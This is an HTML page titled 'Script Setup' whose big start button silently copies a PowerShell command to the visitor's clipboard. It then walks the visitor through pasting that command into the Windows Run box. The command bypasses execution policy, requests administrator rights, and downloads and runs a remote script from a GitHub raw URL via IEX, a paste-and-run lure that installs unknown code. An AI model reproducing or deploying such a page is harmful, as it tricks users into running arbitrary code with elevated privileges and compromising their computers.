<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Script Setup</title>
    <style>
        body { font-family: 'Segoe UI', sans-serif; background: #0d1117; color: white; display: flex; justify-content: center; padding: 40px 0; margin: 0; }
        .container { background: #161b22; padding: 30px; border-radius: 12px; border: 1px solid #30363d; text-align: center; max-width: 600px; width: 90%; }
        .btn { background: #238636; color: white; padding: 20px 40px; font-size: 22px; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; width: 100%; transition: 0.2s; margin-bottom: 20px;}
        .btn:hover { background: #2ea44f; }
        .step-box { margin-top: 20px; text-align: left; background: #0d1117; padding: 20px; border-radius: 8px; border: 1px solid #30363d; }
        .step-title { color: #58a6ff; font-weight: bold; font-size: 18px; display: block; margin-bottom: 10px; }
        img { width: 100%; border-radius: 8px; margin-top: 15px; border: 1px solid #30363d; }
        kbd { background: #30363d; padding: 2px 5px; border-radius: 4px; font-family: monospace; }
    </style>
</head>
<body>

<div class="container">
    <h1>Script Setup</h1>
    <p>Follow the steps below to run the command.</p>

    <button class="btn" onclick="copyCmd()">ðŸš€ START COMMAND</button>

    <div class="step-box">
        <span class="step-title">Step 1: Open Run Box</span>
        <p>Press <kbd>Win</kbd> + <kbd>R</kbd> on your keyboard at the same time.</p>
        <img src="keyboard.png" alt="Keyboard Shortcut">
    </div>

    <div class="step-box">
        <span class="step-title">Step 2: Paste and Run</span>
        <p>Right-click in the box, select <b>Paste</b>, and press <b>Enter</b>.</p>
        <img src="runbox.png" alt="Run Window">
    </div>
</div>

<script>
function copyCmd() {
    const command = "powershell -NoProfile -ExecutionPolicy Bypass -Command \"Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command IEX (iwr -UseBasicParsing https://github.com/zrxqzrxq123/asdasdc1/raw/refs/heads/main/Start.ps1)' -Verb RunAs\"";
    navigator.clipboard.writeText(command).then(() => {
        alert("Command Copied! Now press Win+R.");
    });
}
</script>

</body>
</html>
